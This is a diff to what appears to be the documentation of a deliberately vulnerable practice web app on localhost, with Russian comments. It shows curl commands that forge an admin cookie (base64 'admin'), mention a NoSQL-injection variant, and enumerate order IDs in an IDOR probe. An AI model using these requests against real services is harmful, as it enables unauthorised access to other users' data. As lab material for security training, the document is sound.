@@ -137,6 +137,7 @@ curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   --data-urlencode 'card_number=4111-1111-1111-1111' \
   --data-urlencode 'status=all' \
   -b "role=YWRtaW4="
+```
 
 # operator-based вариант (если нужен для демонстрации NoSQLi)
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
@@ -198,6 +199,10 @@ curl -X PUT "http://localhost:8000/auth/login?username=alice"
 
 **IDOR (`/orders/<id>`):**
 ```bash
+# Dashboard сам после загрузки делает запросы:
+# GET /account/orders/ids -> далее GET /orders/<id> для каждого id
+# После этого можно руками перебирать id на /account/dashboard (IDOR order probe).
+
 curl "http://localhost:8000/orders/1"
 curl "http://localhost:8000/orders/2"
 ```
